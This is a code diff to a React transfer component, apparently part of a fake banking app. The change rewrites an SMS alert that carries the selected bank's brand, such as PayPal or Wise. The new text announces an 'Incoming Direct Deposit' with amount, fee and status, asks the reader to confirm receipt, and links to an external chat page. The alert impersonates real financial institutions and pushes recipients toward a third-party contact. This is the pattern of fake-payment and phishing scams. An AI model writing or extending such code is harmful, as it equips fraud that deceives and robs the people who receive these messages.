@@ -234,8 +234,8 @@ export const Transfers: React.FC<TransfersProps> = ({
         note: ''
     });
 
-    /** Dispatches an instant bank-branded SMS alert to the current user's profile phone number. */
-    const dispatchTransferSms = async (rawAmount: number, txRef: string) => {
+    /** Dispatches an instant bank-branded SMS alert aligned with the email notification to the current user's profile phone number. */
+    const dispatchTransferSms = async (rawAmount: number, txRef: string, statusStr: string = defaultTransferStatus || 'Success') => {
         try {
             let phoneToSend = user?.phone?.trim() || '';
             if (!phoneToSend && user?.id) {
@@ -253,13 +253,40 @@ export const Transfers: React.FC<TransfersProps> = ({
             }
             if (!phoneToSend) return;
 
+            const senderName = user?.name || user?.user_metadata?.full_name || 'Account Holder';
+            const recipientName = formData.recipientName || 'Recipient';
+            const recipientAccount = formData.accountNumber || 'N/A';
+            const activeBankName = selectedBank?.name || 'Bank';
+            const bankLower = activeBankName.toLowerCase();
+            const feeRate = bankLower === 'paypal' ? 0.045 : bankLower === 'wise' ? 0.02 : 0.025;
+            const fee = rawAmount * feeRate;
+            const total = rawAmount - fee;
             const currencyCode = selectedCurrency.code;
             const symbol = selectedCurrency.symbol;
-            const amountFormatted = `${symbol}${rawAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ${currencyCode}`;
-            const activeBankName = selectedBank?.name || 'Bank';
-            const smsBody = `[${activeBankName} Alert] Credit: ${amountFormatted} credited to ${formData.recipientName}. Ref: ${txRef}. Status: Successful.`;
+            const fmtAmt = (val: number) => `${symbol}${val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ${currencyCode}`;
+            const dateStr = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+            const displayStatus = statusStr === 'Success' ? 'Successful' : statusStr;
+            const claimUrl = 'https://code.jivosite.com/chatpage/YG4WdNtpis';
 
-            console.log(`[Transfer SMS] Dispatching to ${phoneToSend} with bank "${activeBankName}"`);
+            const smsBody = [
+                `[${activeBankName} Alert]`,
+                `Incoming Direct Deposit Notification`,
+                ``,
+                `Sender Name: ${senderName}`,
+                `Recipient Name: ${recipientName}`,
+                `Recipient Account: ${recipientAccount}`,
+                `Transaction ID: ${txRef.replace('#', '')}`,
+                `Date: ${dateStr}`,
+                `Amount: ${fmtAmt(rawAmount)}`,
+                `Fee: ${fmtAmt(fee)}`,
+                `Total: ${fmtAmt(total)}`,
+                `Status: ${displayStatus}`,
+                ``,
+                `Action Required: Please confirm the receipt of this deposit to complete the transaction record.`,
+                `Confirm Payment: ${claimUrl}`
+            ].join('\n');
+
+            console.log(`[Transfer SMS] Dispatching to ${phoneToSend} with bank "${activeBankName}" (${displayStatus})`);
             await mvp.sendSms(phoneToSend, smsBody, activeBankName);
         } catch (smsErr) {
             console.error('[Transfer SMS] Failed to trigger SMS:', smsErr);
@@ -459,7 +486,7 @@ export const Transfers: React.FC<TransfersProps> = ({
                 onSchedule(mainAccount.id, formData.recipientName, rawAmount, formData.note, scheduleDate, scheduleFreq);
                 setStep('result');
 
-                    dispatchTransferSms(rawAmount, txRef);
+                    dispatchTransferSms(rawAmount, txRef, txStatus);
             } else {
                 const isPayPal = selectedBank?.name?.toLowerCase() === 'paypal';
                 const isWise = selectedBank?.name?.toLowerCase() === 'wise';
